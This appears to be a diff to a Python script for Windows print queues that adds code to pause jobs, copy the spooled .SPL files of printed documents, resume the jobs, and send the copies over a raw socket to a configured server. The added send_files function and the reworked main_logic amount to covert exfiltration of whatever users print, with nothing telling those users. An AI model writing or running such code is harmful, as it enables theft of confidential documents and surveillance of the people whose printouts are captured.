@@ -2,6 +2,7 @@
 #C:\Windows\System32\Printing_Admin_Scripts\ru-RU
 import subprocess as sub
 from os import listdir
+import socket
 
 def get_os():
     output = str(sub.check_output('ver',shell = True))
@@ -25,7 +26,8 @@ def get_os():
     return False
 
 
-
+ServerIP = ''
+ServerPort = 80
 
 files = {'prnjobs.vbs':False,'prncnfg.vbs':False,'prnmngr.vbs':False}
 
@@ -86,14 +88,14 @@ def prnjobs_action(act:str,id:int,printer:str):
     if act == 'resume':
         #Resumes job
         try:
-            sub.call('cscript '+root+dir+'\\prnjobs.vbs ' + '-m -p "' +printer+'" '+'-j '+str(id))
+            sub.check_output('cscript '+root+dir+'\\prnjobs.vbs ' + '-m -p "' +printer+'" '+'-j '+str(id))
             output = True
         except:
             output = False
     elif act == 'pause':
         #pauses job
         try:
-            sub.call('cscript '+root+dir+'\\prnjobs.vbs ' + '-z -p "' +printer+'" '+'-j '+str(id))
+            sub.check_output('cscript '+root+dir+'\\prnjobs.vbs ' + '-z -p "' +printer+'" '+'-j '+str(id))
             output = True
         except:
             output = False
@@ -104,7 +106,7 @@ def stop(id:int,printer:str):
     
     #Stops job
     try:
-        sub.call('cscript '+root+dir+'\\prnjobs.vbs ' + '-x -p "' +printer+'" '+'-j '+str(id))
+        sub.check_output('cscript '+root+dir+'\\prnjobs.vbs ' + '-x -p "' +printer+'" '+'-j '+str(id))
         return True
     except:
         return False
@@ -122,16 +124,32 @@ def resume_all():
 
 
 def copy_files(new_dir:str):
-    global root,dir
     #Copies only .spl files
     #new_dir - where to copy
     output = listdir('C:\\Windows\\System32\\spool\\PRINTERS')
     for f in output:
         if '.SPL' in f or '.spl' in f:
-            print('copy C:\\Windows\\System32\\spool\\PRINTERS\\'+f+' '+new_dir)
-            sub.call('copy C:\\Windows\\System32\\spool\\PRINTERS\\'+f+' '+new_dir,shell=True)
+            #print('copy C:\\Windows\\System32\\spool\\PRINTERS\\'+f+' '+new_dir)
+            sub.check_output('copy C:\\Windows\\System32\\spool\\PRINTERS\\'+f+' '+new_dir,shell=True)
 
+def send_files(dir):
+    global ServerIP,ServerPort
+    #dir - Ex: C:\\folder\\
+    output = listdir(dir)
 
+    sock = socket.socket()
+    try:
+        sock.connect((ServerIP,ServerPort))
+    except:
+        return False
+
+    for f in output:
+        if '.SPL' in f or '.spl' in f:
+            file = open(dir+f,'rb')
+            data = file.read()
+            fr = str(len(data)).encode('utf-8')+b'\n'+f.encode('utf-8')
+            sock.send(fr)
+            sock.send(data)
 
 def get_queue(action=None,ret=False):
     '''
@@ -165,13 +183,22 @@ def get_queue(action=None,ret=False):
         return queue
 
 def main_logic():
-    get_queue(pause_remember)
-    try:
-        sub.call('mkdir new')
-    except:
-        pass
-    copy_files('.\\new')
-    resume_all()
+    
+    while True:
+        jbs = get_queue(pause_remember,ret = True)
+
+        try:
+            sub.check_output('mkdir new',shell=True)
+        except:
+            pass
+
+        copy_files('.\\new')
+
+        resume_all()
+
+        #do smth with files
+        send_files('.\\new\\')
+        break
     return
 
 
